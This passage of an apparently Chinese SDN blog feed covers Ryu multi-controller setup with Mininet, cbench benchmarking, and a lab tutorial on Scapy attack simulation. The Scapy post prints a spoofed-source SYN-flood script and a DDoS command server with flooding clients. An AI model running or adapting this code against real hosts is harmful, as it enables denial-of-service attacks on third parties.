class="line">                                    match=match, instructions=inst)</span><br><span class="line">        datapath.send_msg(mod)</span><br><span class="line"></span><br><span class="line">    @set_ev_cls(ofp_event.EventOFPPacketIn, MAIN_DISPATCHER)</span><br><span class="line">    def packet_in_handler(self, ev):</span><br><span class="line">        msg = ev.msg</span><br><span class="line">        datapath = msg.datapath</span><br><span class="line">        ofproto = datapath.ofproto</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure><p>这样一个简单的多控制器集群模式就搭建好了，是不是不难。接下来就是底层网络拓扑的构建了。</p><h2 id="Mininet构建底层网络"><a href="#Mininet构建底层网络" class="headerlink" title="Mininet构建底层网络"></a>Mininet构建底层网络</h2><p>Mininet作为一个模拟网络拓扑的工具，这次自然逃脱不了。其中<strong>呈神</strong>的一篇博客——<a href="http://www.muzixing.com/pages/2015/08/05/mininetda-jian-duo-kong-zhi-qi-tuo-bu.html" target="_blank" rel="external">Mininet搭建多控制器拓扑</a>，做了充分的说明。再此借鉴其中的代码搭建一个简单的面向多控制器的网络拓扑。</p><h3 id="面向多控制器的网络拓扑"><a href="#面向多控制器的网络拓扑" class="headerlink" title="面向多控制器的网络拓扑"></a>面向多控制器的网络拓扑</h3><p>简单讲就是对一个网络中的交换机进行了逻辑分片，其属于同一分片的交换机连接同一个控制器，不同分片的交换机连接不同的控制器。下面代码定义了一个由9个交换机做成的网络中，分别有三个控制器（每个控制器控制三个交换机）控制的网络。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">from mininet.net import Mininet</span><br><span class="line">from mininet.node import Controller, RemoteController, OVSSwitch</span><br><span class="line">from mininet.cli import CLI</span><br><span class="line">from mininet.log import setLogLevel, info</span><br><span class="line">from mininet.link import Link, Intf, TCLink</span><br><span class="line">from mininet.topo import Topo</span><br><span class="line">import logging</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def multiControllerNet(con_num=3, sw_num=9, host_num=18):</span><br><span class="line">        &quot;Create a network from semi-scratch with multiple controllers.&quot;</span><br><span class="line">        controller_list = []</span><br><span class="line">        switch_list = []</span><br><span class="line">        host_list = []</span><br><span class="line"></span><br><span class="line">        net = Mininet(controller=None, switch=OVSSwitch, link=TCLink)</span><br><span class="line"></span><br><span class="line">        for i in xrange(con_num):</span><br><span class="line">            name = &apos;controller%s&apos; % str(i)</span><br><span class="line">            c = net.addController(name, controller=RemoteController,</span><br><span class="line">                                  port=6661 + i)</span><br><span class="line">            controller_list.append(c)</span><br><span class="line">            print &quot;*** Creating %s&quot; % name</span><br><span class="line"></span><br><span class="line">        print &quot;*** Creating switches&quot;</span><br><span class="line">        switch_list = [net.addSwitch(&apos;s%d&apos; % n) for n in xrange(sw_num)]</span><br><span class="line"></span><br><span class="line">        print &quot;*** Creating hosts&quot;</span><br><span class="line">        host_list = [net.addHost(&apos;h%d&apos; % n) for n in xrange(host_num)]</span><br><span class="line"></span><br><span class="line">        print &quot;*** Creating links of host2switch.&quot;</span><br><span class="line">        for i in xrange(0, sw_num):</span><br><span class="line">            net.addLink(switch_list[i], host_list[i*2])</span><br><span class="line">            net.addLink(switch_list[i], host_list[i*2+1])</span><br><span class="line"></span><br><span class="line">        print &quot;*** Creating interior links of switch2switch.&quot;</span><br><span class="line">        for i in xrange(0, sw_num, sw_num/con_num):</span><br><span class="line">            for j in xrange(sw_num/con_num):</span><br><span class="line">                for k in xrange(sw_num/con_num):</span><br><span class="line">                    if j != k and j &gt; k:</span><br><span class="line">                        net.addLink(switch_list[i+j], switch_list[i+k])</span><br><span class="line"></span><br><span class="line">        print &quot;*** Creating intra links of switch2switch.&quot;</span><br><span class="line"></span><br><span class="line">        # 0-2  3-5 6-8</span><br><span class="line">        # domain1 -&gt; others</span><br><span class="line">        net.addLink(switch_list[0], switch_list[3])</span><br><span class="line">        net.addLink(switch_list[2], switch_list[4])</span><br><span class="line"></span><br><span class="line">        # domain2 -&gt; others</span><br><span class="line">        net.addLink(switch_list[5], switch_list[8])</span><br><span class="line">        net.addLink(switch_list[4], switch_list[6])</span><br><span class="line"></span><br><span class="line">        # domain3 -&gt; others</span><br><span class="line">        net.addLink(switch_list[7], switch_list[1])</span><br><span class="line">        net.addLink(switch_list[6], switch_list[2])</span><br><span class="line"></span><br><span class="line">        print &quot;*** Starting network&quot;</span><br><span class="line">        net.build()</span><br><span class="line">        for c in controller_list:</span><br><span class="line">            c.start()</span><br><span class="line"></span><br><span class="line">        _No = 0</span><br><span class="line">        for i in xrange(0, sw_num, sw_num/con_num):</span><br><span class="line">            for j in xrange(sw_num/con_num):</span><br><span class="line">                switch_list[i+j].start([controller_list[_No]])</span><br><span class="line">            _No += 1</span><br><span class="line"></span><br><span class="line">        #print &quot;*** Testing network&quot;</span><br><span class="line">        #net.pingAll()</span><br><span class="line"></span><br><span class="line">        print &quot;*** Running CLI&quot;</span><br><span class="line">        CLI(net)</span><br><span class="line"></span><br><span class="line">        print &quot;*** Stopping network&quot;</span><br><span class="line">        net.stop()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">        setLogLevel(&apos;info&apos;)  # for CLI output</span><br><span class="line">        multiControllerNet(con_num=3, sw_num=9, host_num=18)</span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>编写脚本启动三个控制器<em>multiControllersSetup.sh</em>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">for i in $(seq 1 3);</span><br><span class="line">  do</span><br><span class="line">  let port=i+6660</span><br><span class="line">  xterm -title &quot;app$i&quot; -hold -e ryu-manager ~/ryu/myRyuApplication/loadCal --ofp-tcp-listen-port=$port</span><br><span class="line">  done</span><br></pre></td></tr></table></figure></p><p>在测试中使用脚本启动控制器的时候会发现，有的应用程序可以启动所有的控制器窗口，而有的应用启动起来一个窗口后就会阻塞住。虽然不知道什么原因，但可以采用一种曲线救国的方式达到目的。启动多个终端，在终端中输入要启动的控制器就好了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ryu-manager ryu/APP/module --ofp-tcp-listen-port=portnumber</span><br></pre></td></tr></table></figure></p><p>其中<em>ryu/APP/module</em>表示应用程序所在的目录，<em>portnumber</em>表示要启动的端口号。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>刚接触多控制器的论文时都是比较抵触的，心里总想着即便有Idea，如何进行试验仿真？现在回过头来看看，也就那么回事。</p><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><ul><li><a href="http://www.muzixing.com/pages/2015/08/05/mininetda-jian-duo-kong-zhi-qi-tuo-bu.html" target="_blank" rel="external">Mininet搭建多控制器拓扑</a></li></ul>]]></content:encoded>
      
      <comments>http://prayallforyou.top/2017/12/01/multiControllerinRyu/#disqus_thread</comments>
    </item>
    
    <item>
      <title>scapy伪造数据包模拟网络攻击行为</title>
      <link>http://prayallforyou.top/2017/11/29/scapy/</link>
      <guid>http://prayallforyou.top/2017/11/29/scapy/</guid>
      <pubDate>Wed, 29 Nov 2017 00:35:00 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;Scapy介绍&quot;&gt;&lt;a href=&quot;#Scapy介绍&quot; class=&quot;headerlink&quot; title=&quot;Scapy介绍&quot;&gt;&lt;/a&gt;Scapy介绍&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Scapy is a Python program that enable
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="Scapy介绍"><a href="#Scapy介绍" class="headerlink" title="Scapy介绍"></a>Scapy介绍</h2><blockquote><p>Scapy is a Python program that enables the user to send, sniff and dissect and forge network packets. This capability allows construction of tools that can probe, scan or attack networks.</p></blockquote><p>摘自官网的一段话，简单讲Scapy是一个Python程序，可以允许用户发送、嗅探、分析和伪造网络数据包。这样就可以用来构建探测、扫描以及攻击网络的工具。如此神奇的一个程序包，那好不好用呢？容不容易上手呢？还行！</p><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><ul><li>scapy （用来制作伪装数据包）</li><li>wireshark （用来测试实验结果）</li></ul><h2 id="模拟SYN攻击"><a href="#模拟SYN攻击" class="headerlink" title="模拟SYN攻击"></a>模拟SYN攻击</h2><ul><li>SYN攻击：正常的TCP连接都需要三次握手，其中在第二次握手过程中，服务器就会为客户端预留一块缓冲区等待客户端发送第三次连接消息。这是如果客户端在就收到二次握手消息时，一直不发送第三次消息，服务器预留的资源就会再过一段时间后释放。如果大量的客户端同时发起连接并拒绝第三次握手消息，严重时就会耗尽服务器的资源，造成宕机。这就是SYN攻击。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy.rumtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">def synFlood(targetIP,dstPort):</span><br><span class="line">    srcList = [&apos;10.0.0.1&apos;,&apos;10.0.0.2&apos;,&apos;10.0.0.3&apos;,&apos;10.0.0.4&apos;]</span><br><span class="line">    for srcPort in range(1024,65535):</span><br><span class="line">        index = random.randrange(4)</span><br><span class="line">        ipLay = IP(src=srcList[index],dst=targetIP)</span><br><span class="line">        tcpLay = TCP(sport=srcPort,dport=dstPort,falgs=&apos;S&apos;)</span><br><span class="line">        pkt = ipLay/tcpLay</span><br><span class="line">        send(pkt)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    targetIp = &apos;10.0.0.10&apos;</span><br><span class="line">    dstPort = 8866</span><br><span class="line">    synFlood(targetIp,dstPort)</span><br></pre></td></tr></table></figure></li></ul><p>上面引入logging的模块可以帮助我们解决在运行程序时出现的IPv6的问题：</p><blockquote><p>WARNING: No route found for IPv6 destination :: (no default route?)</p></blockquote><p>如出现上面的问题，就添加上这句：</p><blockquote><p>logging.getLogger(“scapy.rumtime”).setLevel(logging.ERROR)</p></blockquote><p>借助sudo运行程序，同时启动wireshark去抓包。在抓包的时候设定过滤规则和程序中的一致即可：</p><blockquote><p>tcp.port == 8866</p></blockquote><p>正常情况下就会出现抓包结果了。实验结果如图<img src="/iamges/wireshark_synflood.JPG" alt=""><br>可以看出四个源IP地址（10.0.0.1、10.0.0.2、10.0.0.3、10.0.0.4）随机的向调用自身的端口（1024-65535）向IP为10.0.0.10的主机8866端口发送数据包。由于没有往包里填塞数据，所以会发现Len=0。至此一个简单的SYN洪泛攻击就完事儿了。</p><p>DOS搞定，离DDOS还会远么？</p><h2 id="模拟DDOS攻击"><a href="#模拟DDOS攻击" class="headerlink" title="模拟DDOS攻击"></a>模拟DDOS攻击</h2><p>一个机器就可以发起SYN洪泛攻击，如果让多个机器同时向一个目标发起洪泛攻击，就变成了DDOS（这么理解应该没有错吧）。为了模拟DDOS，借鉴<a href="https://github.com/mrhxz/DDos" target="_blank" rel="external">基于Scapy DDoS攻击</a>采用C-S架构，一个server向连接它的客户端发送攻击命令，客户端收到攻击命令后发送SYN洪泛攻击。</p><h4 id="服务器代码-ddosServer-py-："><a href="#服务器代码-ddosServer-py-：" class="headerlink" title="服务器代码(ddosServer.py)："></a>服务器代码(ddosServer.py)：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import argparse</span><br><span class="line">import socket</span><br><span class="line">from threading import Thread</span><br><span class="line"></span><br><span class="line">socketList = []</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">指令格式#-H xxx.xxx.xxx.xxx -p xxxx -c &lt;start&gt;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">def sendCommand(cmd):</span><br><span class="line">    print &quot;Send command&quot;</span><br><span class="line">    for sock in socketList:</span><br><span class="line">        sock.send(cmd.encode(&apos;utf-8&apos;))</span><br><span class="line"></span><br><span class="line">def waitConnect(s):</span><br><span class="line">    while True:</span><br><span class="line">        sock,addr = s.accept()</span><br><span class="line">        if sock not in socketList:</span><br><span class="line">            print &quot;add sock to list&quot;</span><br><span class="line">            socketList.append(sock)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.bind((&apos;127.0.0.1&apos;,58886))</span><br><span class="line">    s.listen(1024)</span><br><span class="line"></span><br><span class="line">    t = Thread(target=waitConnect,args=(s,))</span><br><span class="line">    t.start()</span><br><span class="line">    print &quot;Wait at least a client connection&quot;</span><br><span class="line">    while not len(socketList):</span><br><span class="line">        pass</span><br><span class="line">    print &quot;It has been a client connection!&quot;</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        print &apos;=&apos;*50</span><br><span class="line">        print &quot;The command format :&apos;#-H xxx.xxx.xxx.xxx -p xxxx -c &lt;start&gt;&apos;&quot;</span><br><span class="line">        cmd_str = raw_input(&apos;Please input cmd:&apos;)</span><br><span class="line">        if len(cmd_str):</span><br><span class="line">            if cmd_str[0] == &apos;#&apos;:</span><br><span class="line">                sendCommand(cmd_str)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><hr><h4 id="客户端代码（ddosClient-py）"><a href="#客户端代码（ddosClient-py）" class="headerlink" title="客户端代码（ddosClient.py）"></a>客户端代码（ddosClient.py）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import socket</span><br><span class="line">import random</span><br><span class="line">import argparse</span><br><span class="line">from multiprocessing import Process</span><br><span class="line">from scapy.all import *</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">isWorking = False</span><br><span class="line">curProcess = None</span><br><span class="line"></span><br><span class="line">def synFlood(target,dstPort):  </span><br><span class="line">    print &apos;=&apos;*100</span><br><span class="line">    print &quot;The syn flood is running!&quot;</span><br><span class="line">    print &quot;=&quot;*100</span><br><span class="line">    srcList = [&apos;100.1.1.1&apos;,&apos;100.1.1.2&apos;,&apos;100.1.1.3&apos;,&apos;100.1.1.4&apos;]</span><br><span class="line">    for srcPort in range(1024,65535):</span><br><span class="line">        index = random.randrange(4)</span><br><span class="line">        ipLay = IP(src=srcList[index],dst=target)</span><br><span class="line">        tcpLay = TCP(sport=srcPort,dport=dstPort,flags=&apos;S&apos;)</span><br><span class="line">        pkt = ipLay/tcpLay</span><br><span class="line">        send(pkt)</span><br><span class="line"></span><br><span class="line">def cmdHandle(sock,parser):</span><br><span class="line">    global curProcess</span><br><span class="line">    while True:</span><br><span class="line">        data = sock.recv(1024).decode(&apos;utf-8&apos;)</span><br><span class="line">        print &quot;The data is:%s&quot;%(data)</span><br><span class="line">        if len(data) == 0:</span><br><span class="line">            print &quot;The data is empty&quot;</span><br><span class="line">            return</span><br><span class="line">        if data[0] == &apos;#&apos;:</span><br><span class="line">            try:</span><br><span class="line">                options = parser.parse_args(data[1:].split())</span><br><span class="line">                #分解指令</span><br><span class="line">                m_host = options.host</span><br><span class="line">                m_port = options.port</span><br><span class="line">                m_cmd = options.cmd</span><br><span class="line">                if m_cmd.lower() ==&apos;start&apos;:</span><br><span class="line">                    if curProcess != None and curProcess.is_alive():</span><br><span class="line">                        curProcess.terminate()</span><br><span class="line">                        curProcess = None</span><br><span class="line">                        os.system(&apos;clear&apos;)</span><br><span class="line">                    print &quot;The synFlood is start&quot;</span><br><span class="line">                    p = Process(target=synFlood,args=(m_host,m_port)) </span><br><span class="line">                    p.start()</span><br><span class="line">                    curProcess = p</span><br><span class="line">                elif m_cmd.lower()==&apos;stop&apos;:</span><br><span class="line">                    if curProcess.is_alive():</span><br><span class="line">                        curProcess.terminate()</span><br><span class="line">                        os.system(&apos;clear&apos;)</span><br><span class="line">            except :</span><br><span class="line">                print &quot;Failed to perform the command!&quot;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    p = argparse.ArgumentParser()</span><br><span class="line">    p.add_argument(&apos;-H&apos;,dest=&apos;host&apos;,type=str)</span><br><span class="line">    p.add_argument(&apos;-p&apos;,dest=&apos;port&apos;,type=int)</span><br><span class="line">    p.add_argument(&apos;-c&apos;,dest=&apos;cmd&apos;,type=str)</span><br><span class="line">    try:</span><br><span class="line">        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        s.connect((&apos;127.0.0.1&apos;,58886))</span><br><span class="line">        print &quot;To connected server was successd!&quot;</span><br><span class="line">        print &apos;=&apos;*40</span><br><span class="line">        cmdHandle(s,p)</span><br><span class="line">    except :</span><br><span class="line">        print &quot;The network connected failed!&quot;</span><br><span class="line">        print &quot;Please restart the script!&quot;</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>1、启动服务器会显示等待客户端连接，然后启动客户端发起连接。</p><p>2、在服务器按照指定格式输入指令（应目标主机100.66.7.99的8080为例）</p><blockquote><p>#-H 100.66.7.99 -p 8080 -c start</p></blockquote><p>3、客户端会显示开始发包</p><p>采用wireshark抓包会显示攻击成功，实验截图<img src="/iamges/ddos.JPG" alt="">。</p><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><ul><li><a href="https://jingyan.baidu.com/article/7f41ececede744593c095c79.html" target="_blank" rel="external">使用wireshark常用的过滤命令</a></li><li><a href="https://www.cnblogs.com/coser/archive/2011/12/17/2291160.html" target="_blank" rel="external">浅析Python中的struct模块</a></li><li><a href="http://blog.csdn.net/hitwangpeng/article/details/49278409" target="_blank" rel="external">[python] scapy模块的使用</a></li><li><a href="https://www.cnblogs.com/mrchige/p/6495147.html" target="_blank" rel="external">Scapy实现SYN泛洪攻击</a></li><li><a href="https://github.com/mrhxz/DDos" target="_blank" rel="external">基于Scapy DDoS攻击</a></li></ul>]]></content:encoded>
      
      <comments>http://prayallforyou.top/2017/11/29/scapy/#disqus_thread</comments>
    </item>
    
    <item>
      <title>SDN环境下使用cbench测试ryu控制器性能</title>
      <link>http://prayallforyou.top/2017/11/27/cben-tutorial/</link>
      <guid>http://prayallforyou.top/2017/11/27/cben-tutorial/</guid>
      <pubDate>Mon, 27 Nov 2017 07:15:22 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;前期准备&quot;&gt;&lt;a href=&quot;#前期准备&quot; class=&quot;headerlink&quot; title=&quot;前期准备&quot;&gt;&lt;/a&gt;前期准备&lt;/h2&gt;&lt;p&gt;在SDN环境中有各种各样的控制器（OpenDaylight、ONOS、Ryu、Floodlight、POX、NOX），其中R
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>在SDN环境中有各种各样的控制器（OpenDaylight、ONOS、Ryu、Floodlight、POX、NOX），其中Ryu小巧简易，是科学研究的重要选择之一。SDN三层架构，其中南向接口的标准最为统一，OpenFlow几乎以绝对优势霸占了南向接口，本篇主要讲解使用Ryu+mininet的环境下如何测试控制器的吞吐量性能。</p><ul><li><p>如果你还有还是正想尝试搭建我所说的Ryu控制器，安利一篇博客：<a href="http://blog.csdn.net/u010558281/article/details/53558086" target="_blank" rel="external">Ubuntu系统源码安装SDN控制器之ryu</a>，方便快捷。</p></li><li><p>安装mininet就更简单了，大家可以自行去官网寻求帮助。</p></li><li><p>cbench当然也要安装了，怎么安装呢？在安利一篇吧<a href="https://www.zybuluo.com/wuzhimang/note/398736" target="_blank" rel="external">Cbench最新安装说明</a>,这里说明一点，如果你之前下载安装了完整的mininet，会很自然地省去好多步骤（实践实践就知道了）。</p></li></ul><p>这篇重点是讲cbench的使用，所以到现在就假设你已经把环境搭建好了，进入正题之前，做个约定：Ryu安装在Ryu目录下，Mininet在Mininet目录下，Cbench在oflop目录下。</p><h2 id="吞吐量性能测试"><a href="#吞吐量性能测试" class="headerlink" title="吞吐量性能测试"></a>吞吐量性能测试</h2><p>如何测试呢，用心的Ryu开发人员已经帮我们把脚本写好了，在目录Ryu/ryu/app/下有一个文件cbench.py，这个文件就是用来测试控制器性能的，打开文件，我们可以看到可读性很高的代码。(反正也不长，我就全粘过来了，~.~)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">A dumb OpenFlow 1.0 responder for benchmarking the controller framework.</span><br><span class="line">Intended to be used with oflops cbench.</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from ryu.base import app_manager</span><br><span class="line">from ryu.controller import ofp_event</span><br><span class="line">from ryu.controller.handler import MAIN_DISPATCHER</span><br><span class="line">from ryu.controller.handler import set_ev_cls</span><br><span class="line">from ryu.ofproto import ofproto_v1_0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Cbench(app_manager.RyuApp):</span><br><span class="line">    OFP_VERSIONS = [ofproto_v1_0.OFP_VERSION]</span><br><span class="line"></span><br><span class="line">    def __init__(self, *args, **kwargs):</span><br><span class="line">        super(Cbench, self).__init__(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    @set_ev_cls(ofp_event.EventOFPPacketIn, MAIN_DISPATCHER)</span><br><span class="line">    def packet_in_handler(self, ev):</span><br><span class="line">        msg = ev.msg</span><br><span class="line">        datapath = msg.datapath</span><br><span class="line">        ofproto = datapath.ofproto</span><br><span class="line"></span><br><span class="line">        match = datapath.ofproto_parser.OFPMatch(</span><br><span class="line">            ofproto_v1_0.OFPFW_ALL, 0, 0, 0,</span><br><span class="line">            0, 0, 0, 0, 0, 0, 0, 0, 0)</span><br><span class="line"></span><br><span class="line">        mod = datapath.ofproto_parser.OFPFlowMod(</span><br><span class="line">            datapath, match=match, cookie=0, command=ofproto.OFPFC_ADD,</span><br><span class="line">            idle_timeout=0, hard_timeout=0,</span><br><span class="line">            priority=ofproto.OFP_DEFAULT_PRIORITY,</span><br><span class="line">            flags=0, actions=None)</span><br><span class="line">        datapath.send_msg(mod)</span><br></pre></td></tr></table></figure><p>可以看到Cbench的工作原理也很简单，就是测量控制器处理PacketIn数据包的能力，当数据流流经交换机发现没有已经安装好的指令的时候，相关的交换机就会向控制器发送PacketIn消息请求控制器处理。</p><p>Cbench的用法也很简单，找到Cbench的运行目录<strong>oflops/cbench</strong>，执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cbench --help</span><br></pre></td></tr></table></figure></p><p>就能查看使用说明了，在<a href="http://www.sdnlab.com/2334.html" target="_blank" rel="external">SDN控制器性能测试工具Cbench安装与使用说明</a>也想中文说明。</p><p>如果测试一个交换机是吞吐性能的测试命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cbench -c ip -p port -s 1 -m 1000 -t</span><br></pre></td></tr></table></figure></p><p>其中ip即为Ryu控制器的运行机器的ip，port即为mininet和控制器相连的端口，通常默认为6653。</p><h2 id="脚本简化工作量"><a href="#脚本简化工作量" class="headerlink" title="脚本简化工作量"></a>脚本简化工作量</h2><p>测试性能，就需要全方位多角度考察，举个简单地例子，我们可以测试控制器连接不同的交换机时处理能力会不会收到影响。以1-10个交换机为例，可以写脚本如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">ip=127.0.0.1</span><br><span class="line">port=6653</span><br><span class="line">cycle=1000</span><br><span class="line">mode=-t</span><br><span class="line">for i in $(seq 1 10);</span><br><span class="line">  do</span><br><span class="line">  cbench -c $&#123;ip&#125; -p $&#123;port&#125; -s $&#123;i&#125; -m 